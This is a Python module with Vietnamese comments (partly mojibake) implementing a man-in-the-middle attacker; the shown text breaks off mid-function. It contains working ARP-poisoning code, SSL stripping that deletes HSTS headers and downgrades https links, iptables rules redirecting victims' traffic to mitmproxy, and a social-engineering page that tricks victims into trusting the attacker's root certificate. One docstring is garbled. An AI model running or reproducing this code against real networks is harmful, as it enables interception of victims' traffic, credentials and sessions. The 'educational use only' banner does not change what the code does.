#!/usr/bin/env python3
"""
Man-in-the-Middle (MitM) Attack Module - Phi√™n b·∫£n t·ªëi ∆∞u h√≥a
Th·ª±c hi·ªán t·∫•n c√¥ng ARP Poisoning ƒë·ªÉ xen v√†o gi·ªØa hai thi·∫øt b·ªã.
*** C·∫¢NH B√ÅO: CH·ªà S·ª¨ D·ª§NG CHO M·ª§C ƒê√çCH GI√ÅO D·ª§C V√Ä NGHI√äN C·ª®U. ***
"""

import threading
import time
import os
import socket
import logging
import netifaces
import json
import sys
import ssl
import struct
import re
import subprocess
import shutil
import http.server
import socketserver
from typing import Optional, Dict, List
from colorama import Fore, Style

try:
    from netfilterqueue import NetfilterQueue
except ImportError:
    NetfilterQueue = None
from scapy.all import Ether, ARP, srp, sendp, sniff, IP, TCP, UDP, Raw
from . import utils  # Import module utils
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

def get_local_ip(interface: str) -> Optional[str]:
    """L·∫•y ƒë·ªãa ch·ªâ IP c·ªßa m√°y ƒëang ch·∫°y script tr√™n interface ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh.

    H√†m n√†y th·ª≠ l·∫•y ƒë·ªãa ch·ªâ IPv4 ƒë∆∞·ª£c g√°n cho m·ªôt interface m·∫°ng c·ª• th·ªÉ.
    N√≥ ∆∞u ti√™n s·ª≠ d·ª•ng th∆∞ vi·ªán `netifaces` ƒë·ªÉ c√≥ k·∫øt qu·∫£ ch√≠nh x√°c,
    sau ƒë√≥ fallback v·ªÅ ph∆∞∆°ng ph√°p s·ª≠ d·ª•ng socket n·∫øu `netifaces` th·∫•t b·∫°i.

    Args:
        interface: T√™n c·ªßa interface m·∫°ng (v√≠ d·ª•: 'eth0', 'wlan0').

    Returns:
        M·ªôt chu·ªói ch·ª©a ƒë·ªãa ch·ªâ IP n·∫øu th√†nh c√¥ng, ng∆∞·ª£c l·∫°i tr·∫£ v·ªÅ None.
    """
    try:
        # S·ª≠ d·ª•ng netifaces ƒë·ªÉ l·∫•y IP local
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            return addrs[netifaces.AF_INET][0]['addr']
    except Exception:
        pass

    # Fallback: s·ª≠ d·ª•ng socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return None

def get_mac(ip: str, interface: str, retries: int = 3, timeout: int = 2) -> Optional[str]:
    """L·∫•y ƒë·ªãa ch·ªâ MAC c·ªßa m·ªôt IP trong m·∫°ng LAN v·ªõi c∆° ch·∫ø retry.

    G·ª≠i m·ªôt g√≥i tin ARP request ƒë·∫øn ƒë·ªãa ch·ªâ IP m·ª•c ti√™u ƒë·ªÉ ph√¢n gi·∫£i
    ƒë·ªãa ch·ªâ MAC t∆∞∆°ng ·ª©ng. H√†m n√†y s·∫Ω th·ª≠ l·∫°i n·∫øu kh√¥ng nh·∫≠n ƒë∆∞·ª£c
    ph·∫£n h·ªìi trong kho·∫£ng th·ªùi gian ch·ªù.

    Args:
        ip: ƒê·ªãa ch·ªâ IP c·ªßa thi·∫øt b·ªã m·ª•c ti√™u.
        interface: T√™n interface m·∫°ng ƒë·ªÉ g·ª≠i g√≥i tin (v√≠ d·ª•: 'eth0').
        retries: S·ªë l·∫ßn th·ª≠ l·∫°i t·ªëi ƒëa n·∫øu kh√¥ng nh·∫≠n ƒë∆∞·ª£c ph·∫£n h·ªìi.
        timeout: Th·ªùi gian ch·ªù (gi√¢y) cho m·ªói l·∫ßn th·ª≠.

    Returns:
        M·ªôt chu·ªói ch·ª©a ƒë·ªãa ch·ªâ MAC n·∫øu th√†nh c√¥ng, ng∆∞·ª£c l·∫°i tr·∫£ v·ªÅ None.
    """
    for i in range(retries):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), 
                        timeout=timeout, iface=interface, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            logging.warning(f"Kh√¥ng nh·∫≠n ƒë∆∞·ª£c ph·∫£n h·ªìi ARP t·ª´ {ip} (l·∫ßn th·ª≠ {i+1}/{retries})")
        except Exception as e:
            logging.error(f"L·ªói khi l·∫•y MAC c·ªßa {ip} (l·∫ßn th·ª≠ {i+1}/{retries}): {e}")

        if i < retries - 1:
            time.sleep(1) # Ch·ªù 1 gi√¢y tr∆∞·ªõc khi th·ª≠ l·∫°i

    return None

def get_network_info(interface: str) -> Dict:
    """L·∫•y th√¥ng tin m·∫°ng chi ti·∫øt c·ªßa m·ªôt interface.

    S·ª≠ d·ª•ng th∆∞ vi·ªán `netifaces` ƒë·ªÉ truy xu·∫•t ƒë·ªãa ch·ªâ IP, netmask, v√†
    ƒë·ªãa ch·ªâ broadcast c·ªßa interface ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh.

    Args:
        interface: T√™n c·ªßa interface m·∫°ng (v√≠ d·ª•: 'eth0').

    Returns:
        M·ªôt dictionary ch·ª©a th√¥ng tin m·∫°ng ('ip', 'netmask', 'broadcast').
        Tr·∫£ v·ªÅ m·ªôt dictionary r·ªóng n·∫øu c√≥ l·ªói x·∫£y ra.
    """
    try:
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            ip_info = addrs[netifaces.AF_INET][0]
            return {
                'ip': ip_info['addr'],
                'netmask': ip_info['netmask'],
                'broadcast': ip_info.get('broadcast', '')
            }
    except Exception as e:
        logging.error(f"L·ªói khi l·∫•y th√¥ng tin m·∫°ng: {e}")
    return {}

class MitmAttacker:
    """
    L·ªõp th·ª±c hi·ªán t·∫•n c√¥ng Man-in-the-Middle (MitM) t·ªëi ∆∞u h√≥a.
    """
    
    def __init__(self, interface: str, victim_ips: List[str], gateway_ip: str,
                 enable_sniffing: bool = True, poison_interval: int = 2,
                 enable_ssl_stripping: bool = False,
                 enable_ssl_interception: bool = False,
                 enable_violent_mode: bool = False):
        """Kh·ªüi t·∫°o MitM attacker.

        Args:
            interface: T√™n interface m·∫°ng.
            victim_ips: Danh s√°ch IP c·ªßa c√°c n·∫°n nh√¢n.
            gateway_ip: IP c·ªßa gateway (router).
            enable_sniffing: B·∫≠t packet sniffing.
            poison_interval: Kho·∫£ng th·ªùi gian g·ª≠i ARP poison (gi√¢y).
            enable_ssl_stripping: B·∫≠t SSL Stripping (y√™u c·∫ßu netfilterqueue).
            enable_ssl_interception: B·∫≠t SSL Interception (y√™u c·∫ßu mitmproxy).
            enable_violent_mode: B·∫≠t ch·∫ø ƒë·ªô ch·∫∑n c√°c domain l·ªõn (y√™u c·∫ßu mitmproxy).
        """
        self.interface = interface
        self.victim_ips = victim_ips
        self.gateway_ip = gateway_ip
        self.poison_interval = poison_interval
        self.enable_sniffing = enable_sniffing
        self.enable_ssl_stripping = enable_ssl_stripping
        self.enable_ssl_interception = enable_ssl_interception
        self.enable_violent_mode = enable_violent_mode

        if self.enable_ssl_stripping and NetfilterQueue is None:
            raise ImportError("Th∆∞ vi·ªán 'netfilterqueue' l√† b·∫Øt bu·ªôc cho SSL Stripping. Vui l√≤ng c√†i ƒë·∫∑t: pip install netfilterqueue")
        
        self.attacker_ip = get_local_ip(interface)
        if not self.attacker_ip:
            raise ValueError(f"Kh√¥ng th·ªÉ l·∫•y IP local tr√™n interface {interface}")
        
        # C∆° ch·∫ø ƒëi·ªÅu khi·ªÉn
        self.stop_event = threading.Event()
        self.threads = []
        self.mitmdump_path = self._find_mitmdump_path()
        self.mitmproxy_process = None
        self.mitmproxy_script_path = None # Th√™m thu·ªôc t√≠nh n√†y
        self.cert_delivery_server = None
        self.queue = None # For NetfilterQueue

        self.stats = {
            'arp_packets_sent': 0,
            'packets_intercepted': 0,
            'http_requests': 0,
            'dns_queries': 0,
            'start_time': None,
        }
        self.stats_lock = threading.Lock()
        
        # MAC addresses
        self.victim_macs: Dict[str, str] = {}
        self.gateway_mac = None
        
        # IP forwarding state
        self.original_ip_forward = self._get_ip_forward_state()
        
        # L·∫•y logger ƒë√£ ƒë∆∞·ª£c c·∫•u h√¨nh s·∫µn t·ª´ root
        self.logger = logging.getLogger(__name__)

        if (self.enable_ssl_interception or self.enable_violent_mode) and not self.mitmdump_path:
            error_msg = "C√¥ng c·ª• 'mitmproxy' l√† b·∫Øt bu·ªôc cho SSL Interception. Vui l√≤ng c√†i ƒë·∫∑t: pip install mitmproxy"
            self.logger.error(error_msg)
            raise ImportError(error_msg)

        
    def _select_targets_from_menu(self, available_targets: List[str], prompt: str) -> Optional[List[str]]:
        """Hi·ªÉn th·ªã menu ƒë·ªÉ ng∆∞·ªùi d√πng ch·ªçn m·ªôt ho·∫∑c nhi·ªÅu m·ª•c ti√™u.

        H√†m n√†y t·∫£i th√¥ng tin thi·∫øt b·ªã t·ª´ database, hi·ªÉn th·ªã m·ªôt danh s√°ch
        c√°c m·ª•c ti√™u c√≥ s·∫µn v√† cho ph√©p ng∆∞·ªùi d√πng ch·ªçn m·ªôt, nhi·ªÅu, ho·∫∑c
        t·∫•t c·∫£ c√°c m·ª•c ti√™u ƒë·ªÉ t·∫•n c√¥ng.

        Args:
            available_targets: Danh s√°ch c√°c ƒë·ªãa ch·ªâ IP c√≥ s·∫µn ƒë·ªÉ l·ª±a ch·ªçn.
            prompt: Chu·ªói ti√™u ƒë·ªÅ ƒë·ªÉ hi·ªÉn th·ªã cho menu l·ª±a ch·ªçn.

        Returns:
            M·ªôt danh s√°ch c√°c ƒë·ªãa ch·ªâ IP ƒë√£ ƒë∆∞·ª£c ng∆∞·ªùi d√πng ch·ªçn, ho·∫∑c None n·∫øu
            ng∆∞·ªùi d√πng h·ªßy b·ªè.
        """
        print("0. T·∫•n c√¥ng t·∫•t c·∫£ c√°c m·ª•c ti√™u trong danh s√°ch")
        print(f"\n=== {prompt.upper()} ===")
        devices_info = utils.load_device_database(self.logger)
            
        for i, ip in enumerate(available_targets, 1):
            device_info = devices_info.get(ip, {})
            hostname = device_info.get('hostname', 'Unknown')
            vendor = device_info.get('mac_vendor', device_info.get('vendor', 'Unknown'))
            os_info = device_info.get('os', 'Unknown')
            device_type = device_info.get('device_type', 'Unknown')
            risk_level = device_info.get('security_info', {}).get('risk_level', 'low')
            
            # Hi·ªÉn th·ªã th√¥ng tin chi ti·∫øt h∆°n
            print(f"{i}. {ip} - {hostname}")
            print(f"   üì± {vendor} | {os_info} | {device_type.title()} | Risk: {risk_level.upper()}")
        
        while True:
            try:
                choice_str = input(f"\nCh·ªçn m·ª•c ti√™u (v√≠ d·ª•: 1,3,5 ho·∫∑c 0 cho t·∫•t c·∫£): ")
                if not choice_str.strip():
                    continue
                
                if choice_str.strip() == '0':
                    self.logger.info(f"ƒê√£ ch·ªçn t·∫•n c√¥ng t·∫•t c·∫£ {len(available_targets)} m·ª•c ti√™u.")
                    return available_targets

                choices = [int(c.strip()) for c in choice_str.split(',')]
                selected_ips = []
                for choice in choices:
                    if 1 <= choice <= len(available_targets):
                        selected_ips.append(available_targets[choice - 1])
                
                if selected_ips:
                    self.logger.info(f"ƒê√£ ch·ªçn c√°c m·ª•c ti√™u: {', '.join(selected_ips)}")
                    return selected_ips
                else:
                    print("L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá. Vui l√≤ng th·ª≠ l·∫°i.")
            except ValueError:
                print("Vui l√≤ng nh·∫≠p s·ªë.")
        
    def _find_mitmdump_path(self) -> Optional[str]:
        """T√¨m ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi ƒë·∫øn file th·ª±c thi 'mitmdump'.

        H√†m n√†y r·∫•t quan tr·ªçng khi ch·∫°y script v·ªõi `sudo`, v√¨ `sudo` c√≥ th·ªÉ
        reset bi·∫øn m√¥i tr∆∞·ªùng PATH, l√†m cho c√°c l·ªánh th√¥ng th∆∞·ªùng kh√¥ng
        t√¨m th·∫•y file th·ª±c thi. N√≥ s·∫Ω ∆∞u ti√™n t√¨m trong th∆∞ m·ª•c `bin` c·ªßa
        m√¥i tr∆∞·ªùng ·∫£o (virtual environment) hi·ªán t·∫°i tr∆∞·ªõc khi t√¨m trong
        PATH c·ªßa h·ªá th·ªëng.

        Returns:
            M·ªôt chu·ªói ch·ª©a ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi ƒë·∫øn 'mitmdump' n·∫øu t√¨m th·∫•y,
            ng∆∞·ª£c l·∫°i tr·∫£ v·ªÅ None.
        """
        # 1. Ki·ªÉm tra trong c√πng th∆∞ m·ª•c bin c·ªßa python interpreter hi·ªán t·∫°i (cho venv)
        venv_path = os.path.join(os.path.dirname(sys.executable), 'mitmdump')
        if os.path.exists(venv_path) and os.access(venv_path, os.X_OK):
            return venv_path
        # 2. N·∫øu kh√¥ng c√≥, ki·ªÉm tra trong PATH h·ªá th·ªëng
        system_path = shutil.which('mitmdump')
        return system_path

    def _start_ca_delivery_server(self, host_ip: str, port: int = 8001):
        """Kh·ªüi ƒë·ªông m·ªôt web server ƒë∆°n gi·∫£n ƒë·ªÉ cung c·∫•p ch·ª©ng ch·ªâ CA.

        Server n√†y ph·ª•c v·ª• m·ªôt trang HTML h∆∞·ªõng d·∫´n ng∆∞·ªùi d√πng c√°ch c√†i ƒë·∫∑t
        ch·ª©ng ch·ªâ CA c·ªßa mitmproxy v√† cung c·∫•p file ch·ª©ng ch·ªâ ƒë·ªÉ t·∫£i v·ªÅ.
        ƒêi·ªÅu n√†y r·∫•t h·ªØu √≠ch khi th·ª±c hi·ªán t·∫•n c√¥ng SSL Interception.

        Args:
            host_ip: ƒê·ªãa ch·ªâ IP m√† server s·∫Ω l·∫Øng nghe.
            port: C·ªïng m√† server s·∫Ω l·∫Øng nghe.
        """
        
        ca_path = os.path.expanduser("~/.mitmproxy/mitmproxy-ca-cert.pem")
        if not os.path.exists(ca_path):
            self.logger.error(f"Kh√¥ng t√¨m th·∫•y ch·ª©ng ch·ªâ CA t·∫°i: {ca_path}")
            self.logger.error("Vui l√≤ng ch·∫°y mitmproxy ho·∫∑c mitmdump m·ªôt l·∫ßn ƒë·ªÉ t·∫°o ch·ª©ng ch·ªâ, sau ƒë√≥ th·ª≠ l·∫°i.")
            return

        html_content = f"""
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><title>C√†i ƒë·∫∑t Ch·ª©ng ch·ªâ B·∫£o m·∫≠t</title>
<style>body{{font-family:sans-serif;line-height:1.6;padding:2em;max-width:800px;margin:auto;background-color:#f4f4f4;color:#333}}.container{{background-color:#fff;padding:2em;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1)}}h1{{color:#d9534f}}a{{color:#0275d8;text-decoration:none;font-weight:bold}}.button{{display:inline-block;padding:10px 20px;background-color:#5cb85c;color:#fff;border-radius:5px;text-align:center}}.warning{{border-left:5px solid #f0ad4e;padding:10px;background-color:#fcf8e3}}</style>
</head><body><div class="container"><h1>C·∫≠p nh·∫≠t C·∫•u h√¨nh B·∫£o m·∫≠t M·∫°ng</h1>
<p class="warning"><b>L∆∞u √Ω:</b> ƒê·ªÉ ƒë·∫£m b·∫£o k·∫øt n·ªëi an to√†n v√† truy c·∫≠p ƒë·∫ßy ƒë·ªß c√°c d·ªãch v·ª• n·ªôi b·ªô, b·∫°n c·∫ßn c√†i ƒë·∫∑t ch·ª©ng ch·ªâ b·∫£o m·∫≠t c·ªßa ch√∫ng t√¥i.</p>
<h2>B∆∞·ªõc 1: T·∫£i Ch·ª©ng ch·ªâ</h2><p>Nh·∫•p v√†o n√∫t b√™n d∆∞·ªõi ƒë·ªÉ t·∫£i file ch·ª©ng ch·ªâ v·ªÅ thi·∫øt b·ªã c·ªßa b·∫°n.</p>
<p><a href="/cert.pem" class="button">T·∫£i Ch·ª©ng ch·ªâ (mitmproxy-ca-cert.pem)</a></p>
<h2>B∆∞·ªõc 2: C√†i ƒë·∫∑t Ch·ª©ng ch·ªâ</h2><p>Sau khi t·∫£i v·ªÅ, h√£y l√†m theo h∆∞·ªõng d·∫´n cho h·ªá ƒëi·ªÅu h√†nh c·ªßa b·∫°n:</p>
<h3>Windows</h3><ol><li>M·ªü file <b>cert.pem</b> v·ª´a t·∫£i.</li><li>Nh·∫•p v√†o "Install Certificate...".</li><li>Ch·ªçn "Current User" r·ªìi nh·∫•p "Next".</li><li>Ch·ªçn "Place all certificates in the following store", nh·∫•p "Browse...".</li><li>Ch·ªçn <b>"Trusted Root Certification Authorities"</b>, nh·∫•p "OK" r·ªìi "Next".</li><li>Nh·∫•p "Finish". ƒê·ªìng √Ω v·ªõi c·∫£nh b√°o b·∫£o m·∫≠t n·∫øu c√≥.</li></ol>
<h3>Android</h3><ol><li>V√†o <b>C√†i ƒë·∫∑t > B·∫£o m·∫≠t > C√°c c√†i ƒë·∫∑t b·∫£o m·∫≠t kh√°c > C√†i ƒë·∫∑t t·ª´ b·ªô nh·ªõ thi·∫øt b·ªã</b>.</li><li>Ch·ªçn <b>Ch·ª©ng ch·ªâ CA</b> (c√≥ th·ªÉ y√™u c·∫ßu nh·∫≠p m√£ PIN ho·∫∑c m·∫≠t kh·∫©u m√†n h√¨nh kh√≥a).</li><li>Ch·ªçn file <b>cert.pem</b> b·∫°n v·ª´a t·∫£i v·ªÅ.</li></ol>
<h3>iOS (iPhone/iPad)</h3><ol><li>T·∫£i file ch·ª©ng ch·ªâ (tr√¨nh duy·ªát s·∫Ω hi·ªÉn th·ªã th√¥ng b√°o "Profile Downloaded").</li><li>V√†o <b>C√†i ƒë·∫∑t > ƒê√£ t·∫£i v·ªÅ h·ªì s∆°</b> (General > Profile Downloaded).</li><li>Nh·∫•p v√†o "Install" ·ªü g√≥c tr√™n b√™n ph·∫£i v√† l√†m theo h∆∞·ªõng d·∫´n.</li><li><b>Quan tr·ªçng:</b> Sau khi c√†i, v√†o <b>C√†i ƒë·∫∑t > C√†i ƒë·∫∑t chung > Gi·ªõi thi·ªáu > C√†i ƒë·∫∑t tin c·∫≠y ch·ª©ng nh·∫≠n</b> (General > About > Certificate Trust Settings).</li><li>B·∫≠t c√¥ng t·∫Øc cho ch·ª©ng ch·ªâ <b>mitmproxy</b>.</li></ol>
<p>Sau khi ho√†n t·∫•t, h√£y th·ª≠ t·∫£i l·∫°i trang web b·∫°n ƒëang truy c·∫≠p.</p></div></body></html>
        """

        class CAHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                pass # Ghi ƒë√® ƒë·ªÉ kh√¥ng in log ra console

            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header("Content-type", "text/html; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(html_content.encode('utf-8'))
                elif self.path == '/cert.pem':
                    try:
                        with open(ca_path, 'rb') as f:
                            self.send_response(200)
                            self.send_header("Content-type", "application/x-x509-ca-cert")
                            self.send_header("Content-Disposition", "attachment; filename=mitmproxy-ca-cert.pem")
                            self.end_headers()
                            self.wfile.write(f.read())
                    except FileNotFoundError:
                        self.send_error(404, "File Not Found: cert.pem")
                else:
                    self.send_error(404, "File Not Found")

        try:
            httpd = socketserver.ThreadingTCPServer((host_ip, port), CAHandler)
            self.cert_delivery_server = httpd
            server_thread = threading.Thread(target=httpd.serve_forever, daemon=True, name="CADeliveryServer")
            server_thread.start()
            self.logger.info(f"‚úÖ Server h·ªó tr·ª£ c√†i ƒë·∫∑t CA ƒë√£ kh·ªüi ƒë·ªông.")
            self.logger.info(f"   N√≥i n·∫°n nh√¢n truy c·∫≠p: {Fore.CYAN}http://{host_ip}:{port}{Style.RESET_ALL}")
        except OSError as e:
            self.logger.error(f"L·ªói khi kh·ªüi ƒë·ªông server CA t·∫°i {host_ip}:{port}: {e}")
            self.logger.error("C·ªïng c√≥ th·ªÉ ƒëang ƒë∆∞·ª£c s·ª≠ d·ª•ng.")
        except Exception as e:
            self.logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi kh·ªüi ƒë·ªông server CA: {e}")

    def _log_subprocess_output(self, pipe, log_func):
        """ƒê·ªçc v√† ghi log output t·ª´ m·ªôt ti·∫øn tr√¨nh con (subprocess).

        H√†m n√†y ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ ch·∫°y trong m·ªôt thread ri√™ng, li√™n t·ª•c ƒë·ªçc
        t·ª´ng d√≤ng output t·ª´ stdout ho·∫∑c stderr c·ªßa m·ªôt ti·∫øn tr√¨nh con v√†
        chuy·ªÉn n√≥ ƒë·∫øn m·ªôt h√†m logging ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh.

        Args:
            pipe: ƒê·ªëi t∆∞·ª£ng pipe (v√≠ d·ª•: `process.stdout`) ƒë·ªÉ ƒë·ªçc output.
            log_func: H√†m logging ƒë·ªÉ g·ªçi v·ªõi m·ªói d√≤ng output (v√≠ d·ª•: `logger.info`).
        """
        try:
            # S·ª≠ d·ª•ng iter ƒë·ªÉ ƒë·ªçc t·ª´ng d√≤ng m·ªôt c√°ch an to√†n
            for line in iter(pipe.readline, b''):
                log_func(f"[mitmproxy] {line.decode('utf-8', errors='ignore').strip()}")
        except Exception as e:
            self.logger.error(f"L·ªói khi ƒë·ªçc output t·ª´ mitmproxy: {e}")
        finally:
            pipe.close()

    def _get_ip_forward_state(self) -> str:
        """Ki·ªÉm tra v√† tr·∫£ v·ªÅ tr·∫°ng th√°i IP forwarding hi·ªán t·∫°i c·ªßa h·ªá th·ªëng.

        ƒê·ªçc file `/proc/sys/net/ipv4/ip_forward` tr√™n Linux ƒë·ªÉ x√°c ƒë·ªãnh
        xem IP forwarding ƒëang ƒë∆∞·ª£c b·∫≠t ('1') hay t·∫Øt ('0').

        Returns:
            Chu·ªói '1' n·∫øu IP forwarding ƒëang b·∫≠t, '0' n·∫øu ƒëang t·∫Øt ho·∫∑c
            kh√¥ng th·ªÉ x√°c ƒë·ªãnh.
        """
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                return f.read().strip()
        except Exception:
            return "0"

    def _set_ip_forward(self, state: str) -> bool:
        """B·∫≠t ho·∫∑c t tr√™n h·ªá th·ªëng Linux.

        Ghi gi√° tr·ªã '1' (b·∫≠t) ho·∫∑c '0' (t·∫Øt) v√†o file
        `/proc/sys/net/ipv4/ip_forward`. Y√™u c·∫ßu quy·ªÅn root ƒë·ªÉ th·ª±c hi·ªán.

        Args:
            state: Chu·ªói '1' ƒë·ªÉ b·∫≠t ho·∫∑c '0' ƒë·ªÉ t·∫Øt IP forwarding.

        Returns:
            True n·∫øu thao t√°c th√†nh c√¥ng, False n·∫øu th·∫•t b·∫°i (v√≠ d·ª•: kh√¥ng c√≥ quy·ªÅn)
        
        ·∫Øt IP forwarding."""
        if os.geteuid() != 0:
            self.logger.warning("C·∫ßn quy·ªÅn root ƒë·ªÉ thay ƒë·ªïi IP forwarding.")
            return False
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(state)
            self.logger.info(f"IP forwarding ƒë√£ ƒë∆∞·ª£c ƒë·∫∑t th√†nh: {state}")
            return True
        except Exception as e:
            self.logger.error(f"L·ªói khi thay ƒë·ªïi IP forwarding: {e}")
            return False

    def _setup_ssl_strip_rules(self):
        """C·∫•u h√¨nh iptables ƒë·ªÉ chuy·ªÉn h∆∞·ªõng traffic cho SSL Stripping."""
        self.logger.info("C·∫•u h√¨nh iptables cho SSL Stripping...")
        # Chuy·ªÉn h∆∞·ªõng c√°c g√≥i tin ƒëi qua (FORWARD chain) tr√™n c·ªïng 80 v√†o queue s·ªë 1
        os.system("iptables -F") # Flush old rules
        os.system("iptables -t nat -F")
        os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1")
        self.logger.info("ƒê√£ th√™m quy t·∫Øc iptables.")

    def _setup_ssl_intercept_rules(self):
        """C·∫•u h√¨nh iptables ƒë·ªÉ chuy·ªÉn h∆∞·ªõng traffic cho SSL Interception (mitmproxy)."""
        self.logger.info("C·∫•u h√¨nh iptables cho SSL Interception...")
        os.system("iptables -F") # Flush old rules
        os.system("iptables -t nat -F")
        # Chuy·ªÉn h∆∞·ªõng traffic HTTPS (443) ƒë·∫øn c·ªïng c·ªßa mitmproxy (m·∫∑c ƒë·ªãnh 8080)
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
        self.logger.info("ƒê√£ th√™m quy t·∫Øc iptables NAT ƒë·ªÉ chuy·ªÉn h∆∞·ªõng c·ªïng 80 v√† 443 ƒë·∫øn 8080.")

        """D·ªçn d·∫πp c√°c quy t·∫Øc iptables."""
        self.logger.info("D·ªçn d·∫πp c√°c quy t·∫Øc iptables cho SSL Strip...")
        # X√≥a c√°c quy t·∫Øc ƒë√£ th√™m.
        os.system("iptables -D FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1")
        self.logger.info("ƒê√£ d·ªçn d·∫πp iptables.")

    def _ssl_strip_packet_processor(self, packet):
        """X·ª≠ l√Ω g√≥i tin ƒë·ªÉ th·ª±c hi·ªán SSL strip."""
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
            # Ch·ªâ x·ª≠ l√Ω c√°c g√≥i tin HTTP response (t·ª´ server v·ªÅ client)
            if scapy_packet[TCP].sport == 80 and scapy_packet[IP].dst in self.victim_ips:
                try:
                    payload = scapy_packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # X√≥a header HSTS ƒë·ªÉ tr√¨nh duy·ªát kh√¥ng t·ª± ƒë·ªông chuy·ªÉn sang HTTPS
                    payload = re.sub(r"Strict-Transport-Security:.*\r\n", "", payload, flags=re.IGNORECASE)
                    
                    # Thay th·∫ø link https:// b·∫±ng http://
                    payload = payload.replace("https://", "http://")
                    
                    # Thay th·∫ø Location header trong c√°c redirect
                    payload = re.sub(r"Location: https://", "Location: http://", payload, flags=re.IGNORECASE)

                    scapy_packet[Raw].load = payload.encode('utf-8')
                    
                    # Scapy s·∫Ω t·ª± t√≠nh l·∫°i checksum v√† len khi g√≥i tin ƒë∆∞·ª£c build l·∫°i
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[TCP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
                    with self.stats_lock:
                        self.stats['http_requests'] += 1 # ƒê·∫øm l√† m·ªôt request ƒë√£ x·ª≠ l√Ω
                    self.logger.info(f"ƒê√£ th·ª±c hi·ªán SSL Strip tr√™n g√≥i tin t·ª´ {scapy_packet[IP].src} ƒë·∫øn {scapy_packet[IP].dst}")
                except Exception as e:
                    self.logger.debug(f"L·ªói khi x·ª≠ l√Ω g√≥i tin SSL Strip: {e}")
        
        packet.accept() # Ch·∫•p nh·∫≠n v√† cho g√≥i tin ƒëi ti·∫øp (d√π c√≥ s·ª≠a ƒë·ªïi hay kh√¥ng)

    def _resolve_single_mac(self, ip: str, device_db: Dict) -> Optional[str]:
        """Ph√¢n gi·∫£i MAC cho m·ªôt m·ª•c ti√™u, ∆∞u ti√™n t·ª´ DB r·ªìi m·ªõi ARP scan."""
        # 1. ∆Øu ti√™n l·∫•y t·ª´ DB
        device_info = device_db.get(ip)
        if device_info and device_info.get('mac_address'):
            mac = device_info['mac_address']
            self.logger.debug(f"T√¨m th·∫•y MAC c·ªßa {ip} trong DB: {mac}")
            return mac

        # 2. N·∫øu kh√¥ng c√≥ trong DB, th·ª±c hi·ªán ARP scan
        self.logger.debug(f"Kh√¥ng t√¨m th·∫•y MAC c·ªßa {ip} trong DB, ƒëang g·ª≠i ARP request...")
        return get_mac(ip, self.interface)

    def _resolve_targets(self) -> bool:
        """Ph√¢n gi·∫£i MAC c·ªßa n·∫°n nh√¢n v√† gateway, ∆∞u ti√™n t·ª´ DB."""
        self.logger.info(f"ƒêang ph√¢n gi·∫£i MAC c·ªßa {len(self.victim_ips)} n·∫°n nh√¢n v√† gateway...")
        device_db = utils.load_device_database(self.logger)

        # Resolve victim MACs in parallel
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_ip = {executor.submit(self._resolve_single_mac, ip, device_db): ip for ip in self.victim_ips}
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    mac = future.result()
                    if mac:
                        self.victim_macs[ip] = mac
                        self.logger.info(f"‚úì N·∫°n nh√¢n: {ip} -> {mac}")
                    else:
                        self.logger.warning(f"‚úó Kh√¥ng th·ªÉ ph√¢n gi·∫£i MAC c·ªßa n·∫°n nh√¢n: {ip}")
                except Exception as e:
                    self.logger.error(f"‚úó L·ªói khi ph√¢n gi·∫£i MAC c·ªßa n·∫°n nh√¢n {ip}: {e}")
        if not self.victim_macs:
            self.logger.error("Kh√¥ng ph√¢n gi·∫£i ƒë∆∞·ª£c MAC cho b·∫•t k·ª≥ n·∫°n nh√¢n n√†o.")
            return False
        # Resolve gateway MAC
        self.gateway_mac = self._resolve_single_mac(self.gateway_ip, device_db)
        if not self.gateway_mac:
            self.logger.error(f"Kh√¥ng t√¨m th·∫•y MAC c·ªßa gateway {self.gateway_ip}")
            return False
        self.logger.info(f"‚úì Gateway: {self.gateway_ip} -> {self.gateway_mac}")
        return True

    def _poison_loop(self):
        """V√≤ng l·∫∑p g·ª≠i c√°c g√≥i tin ARP gi·∫£ m·∫°o."""
        self.logger.info("B·∫Øt ƒë·∫ßu v√≤ng l·∫∑p ARP poisoning...")
        
        while not self.stop_event.is_set():
            try:
                packets_to_send = []
                for victim_ip, victim_mac in self.victim_macs.items():
                    # L·ª´a victim: n√≥i r·∫±ng IP c·ªßa gateway c√≥ MAC c·ªßa attacker
                    packet_to_victim = ARP(op=2, pdst=victim_ip, psrc=self.gateway_ip, hwdst=victim_mac)
